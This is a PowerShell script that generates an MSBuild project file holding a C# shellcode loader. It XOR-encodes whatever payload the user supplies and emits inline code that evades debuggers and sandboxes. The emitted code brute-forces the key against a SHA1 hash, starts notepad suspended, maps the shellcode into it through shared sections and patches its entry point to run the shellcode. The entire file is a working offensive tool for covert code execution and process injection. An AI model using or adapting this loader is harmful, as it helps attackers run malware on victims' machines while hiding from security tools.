function Convert-Hex {
    [CmdletBinding()]
    Param(
        [Parameter(
            Position=0,
            Mandatory=$true,
            ValueFromPipeline=$true,
            ValueFromPipelineByPropertyName=$true
        )]
        [string]$InputObject
    )
    $hexarray = [system.bitconverter]::tostring([System.Text.Encoding]::Default.GetBytes($InputObject)) -split '-'
    $length = $hexarray.length
    $final =  ($hexarray |ForEach-Object { '0x{0:x2}' -f $_ }) -join ','
    return $final
    }

Function get-filename($title, $filter)
{
[System.Reflection.Assembly]::LoadWithPartialName("System.windows.forms")|out-null
$desktopdir = [Environment]::GetFolderPath("Desktop")
$openfiledialog = New-Object System.Windows.Forms.OpenFileDialog
$openfiledialog.InitialDirectory = $desktopdir
$openfiledialog.filter = $filter
$openfiledialog.Title = $title
$result = $openfiledialog.ShowDialog()
if ($result -eq "OK"){
$openfiledialog.FileName
}}

function encode-text ($plaintext, $key)
{
    $cyphertext = $( $plaintext | %{$_ -bxor $key})
    $list = New-Object 'System.Collections.Generic.List[System.Object]'
    $cyphertext | %{$list.add("0x$(`"{0:x2}`" -f $_), ")}
    return $list
}
    $XMLHEAD = @'
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
 <Target Name="Hello">
 <ClassExample />
 </Target>
 <UsingTask
 TaskName="ClassExample"
 TaskFactory="CodeTaskFactory"
 AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
 <Task>
 
 <Code Type="Class" Language="cs">
 <![CDATA[
using System;
using System.Runtime.InteropServices;
using Microsoft.Build.Framework;
using Microsoft.Build.Utilities;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Security.Cryptography;

public class ClassExample :  Task, ITask
{
	[DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(
                            string lpApplicationName,
                            string lpCommandLine,
                            IntPtr lpProcessAttributes,
                            IntPtr lpThreadAttributes,
                            bool bInheritHandles,
                            uint dwCreationFlags,
                            IntPtr lpEnvironment,
                            string lpCurrentDirectory,
                            [In] ref STARTUPINFO lpStartupInfo,
                            out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public string lpReserved;
            public string lpDesktop;
            public string lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }
		[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwCreateSection(
			ref IntPtr section,
			uint desiredAccess,
			IntPtr pAttrs,
			ref LARGE_INTEGER pMaxSize,
			uint pageProt,
			uint allocationAttribs,
			IntPtr hFile);
		[DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
		private static extern int ZwMapViewOfSection(
		IntPtr section,
		IntPtr process,
		ref IntPtr baseAddr,
		IntPtr zeroBits,
		IntPtr commitSize,
		IntPtr stuff,
		ref IntPtr viewSize,
		int inheritDispo,
		uint alloctype,
		uint prot);
        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(
            IntPtr hProcess,
            int procInformationClass,
            ref PROCESS_BASIC_INFORMATION procInformation,
            uint ProcInfoLen,
            ref uint retlen);
        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }
		[StructLayout(LayoutKind.Sequential, Pack = 1)]
         struct LARGE_INTEGER
        {
            public uint LowPart;
            public int HighPart;
        }
        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [Out] byte[] lpBuffer,
            int dwSize,
            out IntPtr lpNumberOfBytesRead);
        [DllImport("kernel32.dll", SetLastError = true)]
        public static extern bool WriteProcessMemory(
            IntPtr hProcess,
            IntPtr lpBaseAddress,
            [MarshalAs(UnmanagedType.AsAny)] object lpBuffer,
            uint nSize,
            ref uint lpNumberOfBytesWritten);
        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);
		[DllImport("Kernel32.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern IntPtr GetCurrentProcess();
		[DllImport("kernel32.dll")]
		static extern UInt32 FlsAlloc(IntPtr lpCallback);
		[DllImport("kernel32.dll")]
        static extern IntPtr VirtualAllocExNuma(
            IntPtr hProcess,
            IntPtr lpAddress,
            uint dwSize,
            UInt32
            flAllocationType,
            UInt32 flProtect,
            UInt32 nndPreferred
            );
        private static string GetHash(HashAlgorithm hashAlgorithm, byte[] input){

            byte[] data = hashAlgorithm.ComputeHash(input);
            var sBuilder = new StringBuilder();
            for (int i = 0; i < data.Length; i++){
                sBuilder.Append(data[i].ToString("x2"));}
            return sBuilder.ToString();}
		
		
    public override bool Execute()
    {
					if (System.Diagnostics.Debugger.IsAttached){
						Environment.Exit(0);}
					var proc = System.Diagnostics.Process.GetCurrentProcess();
					if (proc.ProcessName != "MSBuild"){
						Environment.Exit(0);}
					UInt32 result = FlsAlloc(IntPtr.Zero);
					if (result == 0xFFFFFFFF){
						Environment.Exit(0);}
					IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
					if (mem == null){
						Environment.Exit(0);}
 
'@
$rawornaw = read-host "Raw or CS"
if($rawornaw -eq "raw"){
$payloadfile = get-filename -title "Raw code" -filter "All Files|*"
$hexpayload = get-content $payloadfile -raw | convert-hex
write-host "hexed"
}
elseif ($rawornaw -eq "CS"){
$payloadfile = get-filename -title "CSharp code" -filter "CS files|*.cs;*.txt"
$csharpunformatted= Get-Content $payloadfile -raw
$hexpayload = [regex]::Match($csharpunformatted,"{(.*)}").groups[1].value
}
else{
"no payload";exit
}
$csharp = $hexpayload -split ',' -join '' -replace ' ','' -replace '0x',''
write-host "formated"
$bytes = [byte[]]::new($csharp.length/2)
for($i=0;$i -lt $csharp.length;$i+=2){$bytes[$i/2]=[convert]::tobyte($csharp.Substring($i,2), 16)}
write-host "bytes now"
$sha1 = New-Object System.Security.Cryptography.SHA1CryptoServiceProvider
$hash = ($sha1.ComputeHash($bytes) | %{"{0:x2}" -f $_}) -join ''
$randomdecimal = 1..255 | Get-Random -Count 1
$randomhex =  "{0:x2}" -f $randomdecimal
write-host "XORing with byte $randomhex"
$XORedcode = encode-text $bytes "0x$randomhex"
$length = $XORedcode.length
$formatted = ($XORedcode -join '').TrimEnd(', ')
$XMLHEAD += @"
string orig_hash = `"$hash`";
string test_hash;
byte[] xord = new byte[$length] {$formatted};

"@

$XMLHEAD += @'
                    

					byte[] enc = new byte[xord.Length];
					for (int i = 0; i <= 255; i++){
						for (int f = 0; f < xord.Length; f++){
							enc[f] = (byte)(xord[f] ^ i);}
					

                using (SHA1 sha1hash = SHA1.Create())
                {
                    test_hash = GetHash(sha1hash, enc);
                    if (string.Equals(test_hash, orig_hash )){
					IntPtr section_ = new IntPtr();
					IntPtr localmap_ = new IntPtr();
					IntPtr remotemap_ = new IntPtr();
					IntPtr localsize_ = new IntPtr();
					IntPtr ptr = new IntPtr();
					IntPtr remotesize_ = new IntPtr();
					// Might Need these might not
					LARGE_INTEGER liVal = new LARGE_INTEGER();
					liVal.LowPart = (uint)enc.Length;
					STARTUPINFO si = new STARTUPINFO();
					PROCESS_INFORMATION pi = new PROCESS_INFORMATION();
					PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
					bool res = CreateProcess(null, "C:\\Windows\\System32\\notepad.exe", IntPtr.Zero,
						IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);
					// create section
					ZwCreateSection(ref section_, 0x10000000, (IntPtr)0, ref liVal, 0x40 , 0x08000000, (IntPtr)0);
					
					uint qout = 0;
					IntPtr hProcess = pi.hProcess;
					bool sixfour = Environment.Is64BitProcess;
					ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref qout);
					IntPtr ptrToImageBase = new IntPtr();
					if (!sixfour)
					{	
						ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x08);
					}
					else
					{
						ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);
					}
					byte[] addrBuff = new byte[IntPtr.Size];
					IntPtr nRead1 = IntPtr.Zero;

					ReadProcessMemory(hProcess, ptrToImageBase, addrBuff, addrBuff.Length, out nRead1);
					IntPtr svchostBase = new IntPtr();
					if (!sixfour)
					{
						 svchostBase = (IntPtr)(BitConverter.ToInt32(addrBuff, 0));
					}
					else
					{
						svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuff, 0));
					}
					byte[] data = new byte[0x200];
					IntPtr nRead2 = IntPtr.Zero;
					ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead2);
					uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3c);
					uint opthdr = e_lfanew_offset + 0x28;
					uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);
					IntPtr addressOfentryPoint;
					if (!sixfour)
					{
						addressOfentryPoint = (IntPtr)(entrypoint_rva + (UInt32)svchostBase);
					}
					else
					{
						addressOfentryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);
					}
					//set local section
					ZwMapViewOfSection(section_, GetCurrentProcess(), ref localmap_, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref localsize_, 1, 0, 64);
					//Copy Shellcode to Section
					uint byteswritten = 0;
					WriteProcessMemory(GetCurrentProcess(), localmap_, enc, (uint)enc.Length, ref byteswritten);

					//set remote section
					ZwMapViewOfSection(section_, hProcess , ref remotemap_, (IntPtr)0, (IntPtr)0, (IntPtr)0, ref remotesize_ , 1, 0, 64);
					//patch entry with mov rax *start of code address* jmp rax
					byte[] remoteaddy = null;
					byte[] tmp = new byte[16];
					int j = 0;
					
					if (!sixfour)
					{
						tmp[j] = 0xb8;
						j++;
						Int32 val = (Int32)remotemap_;
						remoteaddy = BitConverter.GetBytes(val);
					}
					else
					{
						tmp[j] = 0x48;
						j++;
						tmp[j] = 0xb8;
						j++;
						Int64 val = (Int64)remotemap_;
						remoteaddy = BitConverter.GetBytes(val);
					}
					for (int l = 0; l < IntPtr.Size; l++)
						tmp[j + l] = remoteaddy[l];

					j += IntPtr.Size;
					tmp[j] = 0xff;
					j++;
					tmp[j] = 0xe0;
					uint tPtr = 0;

					WriteProcessMemory(hProcess, addressOfentryPoint, tmp, (uint)tmp.Length, ref tPtr);
					byte[] readstuff = new byte[0x1000];
					IntPtr nRead = IntPtr.Zero;
					ReadProcessMemory(hProcess, addressOfentryPoint, readstuff, 1024, out nRead);
					ResumeThread(pi.hThread);

	
		
        
				}
			}
		}
	return true;
					}
}
 ]]>
 </Code>
 </Task>
 </UsingTask>
</Project>
'@
$customname = read-host "What do you want your document to be named?"
if($customname -eq ''){$customname="msbuildprocinjection"}
$fullpath = "$pwd\$customname.xml"
$XMLHEAD |Out-File $fullpath
write-host "Your Document is Available at $fullpath"